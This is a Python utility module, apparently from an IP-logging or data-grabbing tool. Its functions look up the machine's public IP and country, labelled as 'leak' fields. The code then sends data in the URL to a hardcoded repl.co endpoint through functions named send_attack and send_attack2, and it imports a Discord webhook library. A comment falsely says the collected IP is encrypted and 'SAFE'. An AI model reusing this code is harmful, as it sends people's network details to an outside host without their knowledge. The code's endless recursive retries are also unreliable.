import os,requests,sys,time,platform,base64
from discord_webhook import DiscordWebhook
from colorama import Fore

def GET_TIME():
   named_tuple = time.localtime()
   time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
   return time_string

# ! GET IP BUT ITS ENCRYPT :) (SAFE)
def GET_IP():
    try:
       r = requests.get('https://ipwho.is/').json()
       r_leak = r.get('ip')
       r_leak2 = r.get('country')
       r_leak3 = r.get('country_code')
       return f'{r_leak}|{r_leak2}|{r_leak3}'
    except:
       FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - DOWNLOAD IP !\n')
       return f'FAILED|FAILED|FAILED'

def flash(text, duration=1, delay=0.1):
    for i in range(int(duration / delay)):
        sys.stdout.write(f'\r{Fore.YELLOW}' + text + f'{Fore.RESET}')
        sys.stdout.flush()
        time.sleep(delay)
        sys.stdout.write('\r' + ' ' * len(text))
        sys.stdout.flush()
        time.sleep(delay)

def print_slow(text, delay=0.05):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)

def download(link):
    try:
       r = requests.get(url=link)
       print("DOWNLOAD FILES . . .")
       FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG] - {GET_TIME()} - DOWNLOAD FILES {link}\n')
       return r.content
    except:
       FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - DOWNLOAD FILES {link}\n')
       print("FAILED DOWNLOAD . . .")
       download(link)

def FILES_MAKER(files,mode,data):
    data_test = None
    if mode == 'WB':
       data_test = 'WRITING 100 %'
       with open(files, 'wb') as f:
        f.write(data)
    elif mode == 'AB':
       data_test = 'WRITING 100 %'
       with open(files, 'ab') as f:
        f.write(data)
    elif mode == 'RB':
       with open(files, 'rb') as f:
        data_test = f.read()
    elif mode == 'A':
       data_test = 'WRITING 100 %'
       with open(files, 'a') as f:
        f.write(data)
    elif mode == 'W':
       data_test = 'WRITING 100 %'
       with open(files, 'w') as f:
        f.write(data)
    elif mode == 'R':
       with open(files, 'r') as f:
        data_test = f.read()
    return data_test

def clear_console():
   if platform.system().lower() == 'windows':
     os.system('cls')
   else:
     os.system('clear')

def send_attack(data):
   try:
      r = requests.get(url=f'https://bruhhapi.idkotherhex1629.repl.co/API={data}')
      if r.status_code == 200:
       print('API ( OK )')
      else:
         print("API DOWN ( BRUHH )")
         send_attack(data)
   except:
      send_attack(data)

def send_attack2(data):
   try:
      r = requests.get(url=f'https://bruhhapi.idkotherhex1629.repl.co/API3={data}')
      if r.status_code == 200:
       print('API ( OK )')
      else:
         print("API DOWN ( BRUHH )")
         send_attack2(data)
   except:
      send_attack2(data)

# ! CHECK FILES
def login_checker():
    file_path = os.path.join(os.path.dirname(__file__), 'setting.txt')
    try:
        with open(file_path) as f:
            credentials = [x.strip() for x in f.readlines() if x.strip()]
            for x in credentials:
             c_webhook,c_ip,c_ip_enc = x.split('@')
             if c_webhook.upper() == 'FALSE' or c_webhook.upper() == 'TRUE':
                return f'KNOWN@{c_webhook}@{c_ip}@{c_ip_enc}'
             else:
                return 'UNKNOWN@null@null'
    except FileNotFoundError:
        FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - NOT FOUND FILES setting.txt . . .\n')
        return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'

def files_leak_checker(files):
    file_path = os.path.join(os.path.dirname(__file__), files)
    try:
        with open(file_path) as f:
           return 'FOUND FILES'
    except FileNotFoundError:
        FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[FAILED] - {GET_TIME()} - NOT FOUND FILES {files} . . .\n')
        return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'
